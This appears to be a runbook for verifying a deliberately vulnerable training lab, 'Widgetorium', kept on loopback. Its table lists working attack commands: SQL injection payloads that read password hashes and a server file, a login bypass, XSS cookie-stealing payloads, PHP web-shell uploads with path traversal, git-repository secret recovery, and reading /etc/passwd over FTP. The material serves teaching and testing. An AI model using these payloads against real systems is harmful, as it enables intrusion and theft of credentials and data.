# Widgetorium verification runbook

Run section A first and last. Then walk B. Then C. D is optional.

Assumes the lab is up (`./setup.sh && ./start.sh`) and you have `curl`,
`openssl`, and ideally `sqlmap`, `testssl.sh`, `gobuster`, `git-dumper`,
`nmap`, `lftp`, `tcpdump`.

---

## A. Nothing is bound beyond loopback

```bash
# every mapping must read 127.0.0.1:
docker compose ps --format '{{.Name}}\t{{.Ports}}'

# host listeners on the lab ports must all be 127.0.0.1
lsof -nP -iTCP -sTCP:LISTEN | grep -E '(:8080|:8443|:21|:211[0-9][0-9])\b'

# from another machine on the LAN (replace with this host's IP): all filtered/closed
nmap -Pn -p 8080,8443,21 <this-host-LAN-IP>
```

`./status.sh` runs the first two and exits non-zero on any `0.0.0.0` / `::` /
`*` binding. `./start.sh` refuses to launch a non-loopback config in the first
place.

---

## B. Per-bug confirmation

| # | Command / steps | Pass condition |
|---|---|---|
| 1 | `sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch --dbs` | UNION/boolean injection found, `widgetorium` + `information_schema` listed |
| 1 | `curl -s "http://127.0.0.1:8080/search.php?q=x%27%20UNION%20SELECT%20username,password_hash,role%20FROM%20users--%20-"` | seed usernames + MD5 hashes in the results table |
| 2 | `curl -si --data-urlencode "username=' OR '1'='1' -- " --data "password=x" http://127.0.0.1:8080/login.php` | `302` to `/account.php`, `Set-Cookie: WIDGET_SESSID=` |
| 3 | log in as admin (bug 2 bypass) → `admin/products.php`, add product name `zz' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password_hash) FROM users ORDER BY id LIMIT 1)),1)-- -` → open `admin/inventory_report.php` | that row's "on hand" cell shows `XPATH syntax error: '~admin:<hash>'` |
| 4a | as seed **customer** `alice` (`curl -c cookies --data-urlencode username=alice --data password=Password123 .../login.php`): `curl -s -b cookies -H 'Content-Type: application/json' -d '{"id":7,"price":0.01}' http://127.0.0.1:8080/api/update_item.php` | `{"ok":true,...}`, `updated.owner_user_id` is 1, `as_user.role` is `customer` |
| 4b | `curl -s -b cookies -H 'Content-Type: application/json' -d '{"id":"7 OR updatexml(1,concat(0x7e,(SELECT LEFT(LOAD_FILE(0x2f7661722f6c69622f6d7973716c2d66696c65732f7365637265742e747874),40))),1)","price":"1.00"}' http://127.0.0.1:8080/api/update_item.php` | verbose SQL-error block contains `XPATH syntax error: '~WIDGETORIUM-LAB-FLAG...` |
| 5 | `openssl s_client -connect 127.0.0.1:8443 -servername widgetorium.local </dev/null 2>&1 \| openssl x509 -noout -subject -ext subjectAltName` | `CN = widget-store-prod-01`, no SAN extension |
| 6 | `./start.sh --expired-cert` then `openssl s_client -connect 127.0.0.1:8443 </dev/null 2>/dev/null \| openssl x509 -noout -dates` | `notAfter=... 2019 GMT` |
| 7 | `testssl.sh 127.0.0.1:8443`; quick check `curl -ks -o /dev/null -w '%{http_code}' --tlsv1.0 --tls-max 1.0 https://127.0.0.1:8443/health.php` | TLS 1.0 and 1.1 offered (curl check returns `200`); SHA1 CBC ciphers (`AES128-SHA`) accepted; DH 1024. RC4/3DES/EXPORT are absent from the base image's OpenSSL. |
| 8 | `curl -ksI https://127.0.0.1:8443/ \| grep -i strict-transport-security` | no output (header absent) |
| 9 | `gobuster dir -u http://127.0.0.1:8080/admin/ -w <wordlist> -x '' 2>/dev/null \| grep git` then `git-dumper http://127.0.0.1:8080/admin/.git/ ./loot && ( cd loot && git log -p ) \| grep -i wdg_live_sk` | dumped repo, `wdg_live_sk_7f3c9a1e42b84d06b1e5c2aa9d770f18` recovered from commit 1 |
| 10 | `for i in $(seq 1001 1030); do curl -s "http://127.0.0.1:8080/orders.php?id=$i" \| grep -o 'Customer ID [0-9]*'; done` | multiple different customer IDs, no login required |
| 11r | `curl -s 'http://127.0.0.1:8080/search.php?q=<script>alert(1)</script>' \| grep '<script>alert(1)'` | payload reflected unencoded |
| 11s | POST a review with body `<script>alert(document.cookie)</script>` to `/review.php`, then `curl -s 'http://127.0.0.1:8080/product.php?id=<pid>' \| grep '<script>alert'` | payload stored and served raw |
| 12 | `printf '<?php echo "SHELL:".shell_exec($_GET["c"]);' > shell.php; curl -s -F 'image=@shell.php' http://127.0.0.1:8080/upload.php; curl -s 'http://127.0.0.1:8080/uploads/shell.php?c=id'` | response contains `SHELL:uid=...` |
| 12t | `curl -s -F 'image=@shell.php' -F 'filename=../trav.php' http://127.0.0.1:8080/upload.php; curl -s 'http://127.0.0.1:8080/trav.php?c=id'` (the `filename` field is used unsanitised; PHP strips the path from `$_FILES['name']` but not from a plain field) | `trav.php` served from `/trav.php`, one dir up from `uploads/` |
| 13 | log in as two seed users ~1s apart, compare `WIDGET_SESSID` (structure `hex(time)+hex(id)`). With an admin session active (bug 2 bypass sets `WIDGET_SESSID=<hextime>0001`): `curl -s -b "WIDGET_SESSID=<that value>" http://127.0.0.1:8080/account.php \| grep -i 'admin'` from a fresh client | the admin account renders; enumerating `hex(time)` around the login recovers the token |
| 14 | `curl -s "http://127.0.0.1:8080/search.php?q=%27" \| grep -i 'SQL ERROR'` | raw failing query + trace in the response body |
| 15 | `echo hi > n.txt; curl -s --ftp-pasv -T n.txt ftp://127.0.0.1/upload/n.txt && curl -s http://127.0.0.1:8080/uploads/ftp/n.txt` | `hi` served over HTTP (anon wrote it) |
| 16 | `curl -s --ftp-pasv -u ftpuser:ftpuser ftp://127.0.0.1/` | login succeeds, listing returned |
| 17 | `lftp -u ftpuser,ftpuser 127.0.0.1 -e 'set ftp:passive-mode on; cd /; ls; cd /etc; cat passwd; bye' \| head` or `curl -s --ftp-pasv -u ftpuser:ftpuser 'ftp://127.0.0.1//etc/passwd'` | `root:x:0:0:` returned (no chroot jail) |
| 18 | `sudo tcpdump -i lo0 -A 'tcp port 21' &` then `curl -s --ftp-pasv -u ftpuser:ftpuser ftp://127.0.0.1/ >/dev/null` | `USER ftpuser` / `PASS ftpuser` visible in the capture |
| 19 | `printf '<?php echo shell_exec($_GET["c"]);' > s.php; curl -s --ftp-pasv -T s.php ftp://127.0.0.1/upload/s.php; curl -s 'http://127.0.0.1:8080/uploads/ftp/s.php?c=id'` | `uid=...` from the web request |

`cookies` above = a cookie jar from a prior `curl -c cookies ... /login.php` as
the relevant user.

---

## C. Reset check

```bash
./reset.sh -y
```

Then re-run B rows 3, 11s, 12, 19. Every planted artefact (injected product,
stored review, uploaded shells) should be gone, and each bug should still
reproduce from the clean seed.

---

## D. ZAP baseline (optional)

```bash
docs/zap/run-zap.sh            # report lands at docs/zap/report.html
```

Expected: ZAP reports bugs 1, 2, 4, 8, 10 (weak), 11, 12, 14. It does **not**
report 3, 5, 6, 7, 9, 13, 15-19. That gap is the teaching point, cross-check it
against `docs/scenarios.md`.
